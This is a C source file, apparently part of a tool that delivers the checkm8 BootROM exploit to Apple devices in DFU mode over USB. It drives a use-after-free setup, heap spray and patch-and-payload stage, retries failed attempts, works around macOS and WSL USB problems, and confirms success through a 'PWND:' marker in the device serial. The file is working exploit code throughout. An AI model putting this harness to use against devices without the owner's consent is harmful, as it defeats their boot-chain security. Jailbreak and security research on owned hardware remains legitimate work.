/* checkm8.c -- checkm8 DFU handler: init, deliver, verify, cleanup */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <libusb.h>

#include "dfu/dfu_handler.h"
#include "dfu/checkm8.h"
#include "dfu/checkm8_internal.h"
#include "dfu/dfu_proto.h"
#include "device/chip_db.h"
#include "device/usb_dfu.h"
#include "util/log.h"

#if defined(__APPLE__)
#include "dfu/iokit_usb.h"
#endif

/* ------------------------------------------------------------------ */
/* dfu_init                                                        */
/* ------------------------------------------------------------------ */

int dfu_init(dfu_ctx_t *ctx, device_info_t *dev)
{
    const chip_info_t *chip;

    if (!ctx || !dev)
        return -1;

    memset(ctx, 0, sizeof(*ctx));
    ctx->dev = dev;

    chip = chip_db_lookup(dev->cpid);
    if (!chip) {
        log_error("dfu_init: unknown CPID 0x%04X", dev->cpid);
        return -1;
    }

    if (!chip->checkm8_compatible) {
        log_error("dfu_init: chip %s (0x%04X) is not compatible",
                  chip->name, chip->cpid);
        return -1;
    }

    if (!dev->usb) {
        log_error("dfu_init: device has no USB handle (not in DFU mode?)");
        return -1;
    }

    ctx->chip = chip;
    ctx->phase = DFU_PHASE_INIT;
    ctx->payload_buf = NULL;
    ctx->payload_len = 0;

    log_info("dfu_init: target %s (%s), CPID 0x%04X",
             chip->name, chip->marketing, chip->cpid);

    return 0;
}

/* ------------------------------------------------------------------ */
/* dfu_deliver                                                     */
/* ------------------------------------------------------------------ */

int dfu_deliver(dfu_ctx_t *ctx)
{
    if (!ctx || !ctx->dev || !ctx->chip)
        return -1;

    log_info("dfu_deliver: starting checkm8 on %s", ctx->chip->name);

    /* Stage 1: Reset DFU state (via libusb) */
    if (checkm8_stage_reset(ctx) != 0)
        goto error;

    /* Stage 2: Setup UAF (via libusb, needs async cancel) */
    if (checkm8_stage_setup(ctx) != 0)
        goto error;

#if defined(__APPLE__)
    /*
     * macOS Apple Silicon: switch from libusb to IOKit AFTER Stage 2 setup.
     *
     * Stage 2's async cancel triggers AbortPipeZero inside libusb, which
     * leaves the libusb Darwin driver in a state where subsequent async
     * transfers fail.
     *
     * By closing libusb and activating our direct IOKit backend now,
     * Stages 3 and 4 will use synchronous DeviceRequestTO, which bypasses
     * the corrupted libusb async state machine and handles EP0 properly.
     */
    {
        log_info("dfu_deliver: closing libusb after Stage 2 setup");
        usb_dfu_close(ctx->dev->usb);
        ctx->dev->usb = NULL;

        log_info("dfu_deliver: switching to IOKit for Stages 3-4");

        /* Deactivate any previous IOKit handle before re-activating,
         * so retry attempts get a fresh device connection instead of
         * reusing a stale handle left over from the prior attempt. */
        iokit_usb_deactivate();

        if (iokit_usb_activate() != 0) {
            log_error("dfu_deliver: IOKit activation failed");
            goto error;
        }

        /* Clean host-side XHCI EP0 ring */
        iokit_usb_abort_pipe_zero();
        usleep(50000);

        /*
         * Do NOT send CLR_STATUS / DFU_ABORT here (matching gaster).
         *
         * After stage 2 the device sits in dfuDNLOAD-IDLE with the
         * pending io_request we intend to hijack.  DFU-class commands
         * from dfuIDLE corrupt the EP0 ring on Apple Silicon XHCI
         * (kIOReturnNotReady → device re-enumerates → the IOKit
         * IOService dies → kIOReturnNoDevice for every later transfer).
         *
         * The spray's stall/leak/no_leak requests walk the DFU state
         * machine forward naturally; the final CLR_STATUS inside the
         * spray (skip_clrstatus=0) is what brings it back to dfuIDLE.
         */
        ctx->skip_clrstatus = 0;
    }
#endif

    /* Stage 3: Heap Spray (uses IOKit on macOS, libusb elsewhere) */
    if (checkm8_stage_spray(ctx) != 0) {
        goto error;
    }

    /* Stage 4: Patch & Payload (handles its own IOKit logic if needed) */
    if (checkm8_stage_patch(ctx) != 0) {
        goto error;
    }

#if defined(__APPLE__)
    iokit_usb_deactivate();
#endif

    log_info("dfu_deliver: all stages complete");
    return 0;

error:
#if defined(__APPLE__)
    iokit_usb_deactivate();
    /*
     * Leave the device in a clean DFU entry.
     *
     * A stage-4 bail-out (EP0 permanently halted after the overwrite
     * STALL) or a wedged DFU state machine would otherwise poison the
     * NEXT run: the device still enumerates, so detection succeeds, but
     * every stage-1 GET_STATUS times out.  A port-level reset forces a
     * fresh re-enumeration while we still hold the device.
     */
    if (ctx->dev) {
        if (ctx->dev->usb) {
            usb_dfu_close(ctx->dev->usb);
            ctx->dev->usb = NULL;
        }
        iokit_usb_recover_bus();
    }
#endif
    return -1;
}

/* ------------------------------------------------------------------ */
/* dfu_cleanup                                                     */
/* ------------------------------------------------------------------ */

void dfu_cleanup(dfu_ctx_t *ctx)
{
    if (!ctx)
        return;

    if (ctx->payload_buf) {
        free(ctx->payload_buf);
        ctx->payload_buf = NULL;
    }

    ctx->payload_len = 0;
    ctx->phase = DFU_PHASE_INIT;
    ctx->dev = NULL;
    ctx->chip = NULL;
}

/* ------------------------------------------------------------------ */
/* checkm8_verify                                                */
/* ------------------------------------------------------------------ */

int checkm8_verify(device_info_t *dev)
{
    char serial[DFU_SERIAL_MAX];
    uint32_t cpid = 0;
    uint64_t ecid = 0;

    if (!dev || !dev->usb)
        return -1;

    memset(serial, 0, sizeof(serial));

#if defined(__APPLE__)
    /*
     * macOS: read the live serial descriptor via IOKit ONLY IF
     * libusb handle is NOT open.  If dev->usb is currently open,
     * calling iokit_usb_activate() causes kIOReturnExclusiveAccess (0xe00002c5)
     * and disrupts the active libusb control pipe!
     */
    if (!dev->usb) {
        char iokit_serial[512] = {0};
        int need_deactivate = 0;

        if (!iokit_usb_is_active()) {
            if (iokit_usb_activate() == 0)
                need_deactivate = 1;
        }

        if (iokit_usb_is_active()) {
            int slen = iokit_usb_read_serial(dev->iserial_index,
                                             iokit_serial,
                                             sizeof(iokit_serial));
            if (slen > 0) {
                log_debug("checkm8_verify: IOKit serial = \"%s\"",
                          iokit_serial);
                if (strstr(iokit_serial, "PWND:")) {
                    log_info("checkm8_verify: device processed "
                             "successfully (IOKit)");
                    if (need_deactivate)
                        iokit_usb_deactivate();
                    return 1;
                }
            } else {
                log_debug("checkm8_verify: IOKit serial read failed "
                          "(ret=%d)", slen);
            }
        }

        if (need_deactivate)
            iokit_usb_deactivate();
    }
#else
    /*
     * Linux: lsusb queries the live device descriptor from the kernel
     * driver. libusb caches the serial from before the exploit.
     */
    {
        FILE *fp2 = popen("lsusb -v -d 05ac:1227 2>/dev/null | grep iSerial", "r");
        if (fp2) {
            char ibuf[256] = {0};
            while (fgets(ibuf, sizeof(ibuf)-1, fp2)) {
                size_t n = strlen(ibuf);
                if (n > 0 && ibuf[n-1] == '\n') ibuf[n-1] = '\0';
                log_debug("checkm8_verify: lsusb iSerial: %s", ibuf);
            }
            pclose(fp2);
        }

        FILE *fp = popen("lsusb -v -d 05ac:1227 2>/dev/null | grep -c 'PWND:'", "r");
        if (fp) {
            int count = 0;
            if (fscanf(fp, "%d", &count) == 1 && count > 0) {
                pclose(fp);
                log_info("checkm8_verify: device processed successfully (lsusb)");
                return 1;
            }
            pclose(fp);
        }
    }
#endif

    /* Fall back to libusb (clears the stale cache by re-reading). */
    if (usb_dfu_read_info(dev->usb, dev->iserial_index,
                          &cpid, &ecid, serial, sizeof(serial)) != 0) {
        /*
         * libusb serial reads fail on usbipd-win even when the device is in
         * processed DFU.  lsusb above already checked.  If the read fails
         * entirely (device disconnected), treat as "not yet done"
         * so the caller can wait for the device to reboot and retry.
         */
        log_warn("checkm8_verify: could not read USB serial (usbipd quirk)");
        return 0;
    }

    log_debug("checkm8_verify: serial = \"%s\"", serial);

    if (strstr(serial, "PWND:") != NULL) {
        log_info("checkm8_verify: device processed successfully");
        return 1;
    }

    log_warn("checkm8_verify: completion marker not found in serial");
    return 0;
}

/* ------------------------------------------------------------------ */
/* usbipd_force_reattach (WSL only)                                    */
/* ------------------------------------------------------------------ */

/*
 * Force usbipd to detach and immediately reattach the Apple DFU device.
 * This clears stale kernel URBs and claimed interfaces that remain when
 * a previous libusb process was killed without releasing the handle —
 * a common occurrence on usbipd-win where the vhci_hcd virtual bus
 * does not auto-clear on process death the way native usbfs does.
 *
 * No-op on non-WSL Linux and on any system where powershell.exe is
 * not available in PATH.
 */
static void usbipd_force_reattach(void)
{
    if (!getenv("WSL_DISTRO_NAME"))
        return;

    log_info("checkm8: forcing usbipd reattach to clear stale USB state...");
    /*
     * Run entirely on the Windows side via powershell.exe.
     * Errors are silenced — if usbipd isn't installed or the device
     * isn't bound, the subsequent usb_dfu_find will fail gracefully.
     */
    system("powershell.exe -NoProfile -NonInteractive -Command "
           "'try { usbipd detach --hardware-id 05ac:1227 2>$null } catch {}; "
           "Start-Sleep -Milliseconds 1500; "
           "try { usbipd attach --hardware-id 05ac:1227 --wsl 2>$null } catch {}' "
           ">/dev/null 2>&1");
    sleep(2); /* wait for vhci_hcd to re-enumerate the virtual device */
}

/* ------------------------------------------------------------------ */
/* checkm8 -- top-level entry point                                    */
/* ------------------------------------------------------------------ */

int checkm8_run(device_info_t *dev)
{
    int attempt;

    if (!dev) {
        log_error("checkm8_run: NULL device");
        return -1;
    }

    log_info("checkm8_run: starting process on CPID 0x%04X", dev->cpid);

    /*
     * Fast path: if the device is already in processed DFU mode (from a
     * previous successful attempt), skip re-processing.
     * checkm8_verify returns 1 if "PWND:" is in the serial.
     *
     * ON DARWIN (macOS):
     * libusb_get_string_descriptor_ascii on a fresh DFU handle before
     * a stage_reset (CLRSTATUS/ABORT) frequently causes kIOReturnTimeout
     * on Apple Silicon XHCI. This poisons the control pipe, causing Stage 1
     * GET_STATUS to timeout later.
     *
     * Fix: Only verify on open handles if we're NOT on Darwin, or if we
     * explicitly need to check a retry handle. For the initial run,
     * assume it needs processing and let stage_reset handle the state.
     */
#if !defined(__APPLE__)
    if (dev->usb && dev->usb_claimed) {
        int pre = checkm8_verify(dev);
        if (pre == 1) {
            log_info("checkm8_run: device already processed, skipping");
            return 0;
        }
    }
#endif

#if defined(__APPLE__)
    /*
     * Pre-flight liveness check.
     *
     * A previous run that bailed out mid-stage-4 can leave EP0 halted on
     * the BootROM side: the device still enumerates (detection succeeds)
     * but every GET_STATUS times out, so stage 1 would burn an attempt
     * pointlessly.  Probe once with a harmless GET_STATUS; if it fails,
     * force a port-level reset so the device re-enters DFU cleanly.
     */
    if (dev->usb) {
        dfu_status_t probe;
        if (dfu_get_status(dev->usb, &probe) != 0) {
            log_warn("checkm8_run: device unresponsive (stale EP0 from a "
                     "previous run) -- forcing USB reset");
            usb_dfu_close(dev->usb);
            dev->usb = NULL;
            iokit_usb_recover_bus();
            sleep(2);
            {
                uint8_t probe_iserial = 0;
                int pa;
                for (pa = 0; pa < 5 && !dev->usb; pa++) {
                    if (usb_dfu_find(&dev->usb, &probe_iserial) == 0)
                        dev->iserial_index = probe_iserial;
                    else if (pa < 4)
                        sleep(2);
                }
            }
            if (!dev->usb) {
                log_error("checkm8_run: DFU device lost during recovery");
                return -1;
            }
            log_info("checkm8_run: device recovered after USB reset");
        }
    }
#endif

    for (attempt = 1; attempt <= MAX_DFU_TRIES; attempt++) {
        dfu_ctx_t ctx;
        int result;

        /* On retries, the device USB-resets after a failed attempt.
         * Close the stale handle and re-enumerate before trying again. */
        if (attempt > 1) {
            if (dev->usb) {
                usb_dfu_close(dev->usb);
                dev->usb = NULL;
            }
            log_info("checkm8_run: waiting for device reset...");
            usleep(USB_RECONNECT_DELAY_USEC);

            /* Force usbipd reattach to clear stale kernel URBs / claimed
             * interfaces from the previous attempt.  No-op on native Linux. */
            usbipd_force_reattach();

            {
                uint8_t new_iserial = 0;
                int find_attempt;
                int found = 0;

                /* Device may be mid-reboot; poll up to 4 times (every 3s). */
                for (find_attempt = 0; find_attempt < 4; find_attempt++) {
                    if (usb_dfu_find(&dev->usb, &new_iserial) == 0) {
                        found = 1;
                        break;
                    }
                    if (find_attempt < 3) {
                        log_info("checkm8_run: DFU device not yet ready, waiting 3s...");
                        sleep(3);
                        usbipd_force_reattach();
                    }
                }
                if (!found) {
                    log_error("checkm8_run: DFU device lost after attempt %d, cannot retry",
                              attempt - 1);
                    return -1;
                }
                /* Re-enumerating can hand back a different iSerial
                 * index if the device was hot-swapped for a different
                 * chip family; refresh the cached value. */
                dev->iserial_index = new_iserial;
            }
            log_info("checkm8_run: USB handle re-acquired for retry %d", attempt);

            /*
             * The previous attempt may have completed successfully, which
             * reboots the device into processed DFU.  Check for completion
             * before re-running -- sending DFU ABORT to a processed device
             * would crash its modified USB stack.
             */
            {
                int pre_pwned = checkm8_verify(dev);
                if (pre_pwned == 1) {
                    log_info("checkm8_run: device already processed after "
                             "attempt %d, skipping re-run", attempt - 1);
                    return 0;
                }
            }
        }

        log_info("checkm8_run: attempt %d/%d", attempt, MAX_DFU_TRIES);

        if (dfu_init(&ctx, dev) != 0) {
            log_warn("checkm8_run: init failed on attempt %d", attempt);
            dfu_cleanup(&ctx);
            continue;
        }

        if (dfu_deliver(&ctx) != 0) {
            log_warn("checkm8_run: attempt %d failed, retrying...", attempt);
            dfu_cleanup(&ctx);
            continue;
        }

        /*
         * After stage 4, libusb_reset_device was sent inside checkm8_stage_patch.
         * The device either:
         *   a) Stayed in DFU with completion marker (success)
         *   b) Rebooted out of DFU (not in MANIFEST-WAIT-RESET)
         *
         * Close the now-stale handle, wait for the device to re-enumerate,
         * then check for completion.  On usbipd we may also need a
         * force_reattach if the device rebooted and usbipd lost tracking.
         */
        if (dev->usb) {
            usb_dfu_close(dev->usb);
            dev->usb = NULL;
        }
        sleep(5); /* give device time to re-enumerate or reboot */
        usbipd_force_reattach();
        sleep(2); /* extra settle after reattach */
        {
            uint8_t new_iserial = 0;
            int fa;
            for (fa = 0; fa < 4; fa++) {
                if (usb_dfu_find(&dev->usb, &new_iserial) == 0)
                    break;
                if (fa < 3) {
                    sleep(3);
                    usbipd_force_reattach();
                }
            }
            if (dev->usb)
                dev->iserial_index = new_iserial;
        }

        result = dev->usb ? checkm8_verify(dev) : 0;
        dfu_cleanup(&ctx);

        if (result == 1) {
            log_info("checkm8_run: success on attempt %d", attempt);
            return 0;
        }

        if (result < 0)
            log_error("checkm8_run: verification error on attempt %d", attempt);
        else
            log_warn("checkm8_run: not completed after attempt %d", attempt);
    }

    log_error("checkm8_run: failed after %d attempts", MAX_DFU_TRIES);
    return -1;
}
